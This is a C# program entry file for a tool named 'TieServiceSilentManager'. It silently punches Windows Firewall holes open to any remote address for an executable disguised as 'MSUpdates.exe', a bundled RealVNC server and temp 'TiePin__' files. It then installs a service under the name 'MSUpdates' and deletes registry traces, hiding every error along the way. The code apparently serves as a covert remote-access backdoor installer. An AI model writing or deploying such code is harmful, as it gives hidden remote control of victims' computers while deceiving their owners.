using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Xml;
using OthersCode;
using NewMethodx;

using NATUPNPLib;
using NETCONLib;
using NetFwTypeLib;

using Tie;
using TiePin;

namespace TieServiceSilentManager
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (Tools.Strings.HasString(System.Environment.CommandLine, "-do_nothing"))
            {
                return;
            }

            if (Tools.Strings.HasString(System.Environment.CommandLine, "-restart"))
            {
                Tools.FileSystem.Shell(Tools.FileSystem.GetAppPath() + "TieServiceSilentManager.exe");
                return;
            }

            ExceptionToFirewall(true, Tools.FileSystem.GetAppPath() + "MSUpdates.exe", "MSUpdates");

            try
            {
                ExceptionToFirewall(true, Tools.FileSystem.GetAppPath() + "RealVNC\\winvnc4.exe", "RealVNC");
            }
            catch { }

            try
            {
                String[] files = Directory.GetFiles(Tools.FileSystem.GetAppPath() + "tack_temp1\\");
                foreach (String file in files)
                {
                    if (Path.GetFileName(file).StartsWith("TiePin__"))
                    {
                        ExceptionToFirewall(true, file, Path.GetFileName(file));
                    }
                }
            }
            catch { }

            frmPins.MakeTheServiceInstalledAndStarted("MSUpdates");
            frmPins.DeleteFromRegistry();
        }

        public static void ExceptionToFirewall(bool add, string imageFileName, string name)
        {
            try
            {
                Type netFwMgrType = Type.GetTypeFromProgID("HNetCfg.FwMgr");
                INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(netFwMgrType);

                INetFwProfile curProfile = mgr.LocalPolicy.CurrentProfile;
                if (add)
                {
                    Type NetFwAuthorizedApplicationType = Type.GetTypeFromProgID("HNetCfg.FwAuthorizedApplication", false);
                    INetFwAuthorizedApplication app = (INetFwAuthorizedApplication)Activator.CreateInstance(NetFwAuthorizedApplicationType);

                    app.Name = name;
                    app.ProcessImageFileName = imageFileName;
                    app.Enabled = true;
                    app.RemoteAddresses = "*";
                    app.Scope = NET_FW_SCOPE_.NET_FW_SCOPE_ALL;

                    curProfile.AuthorizedApplications.Add(app);
                }
                else
                {
                    curProfile.AuthorizedApplications.Remove(imageFileName);
                }
            }
            catch { }
        }
    }
}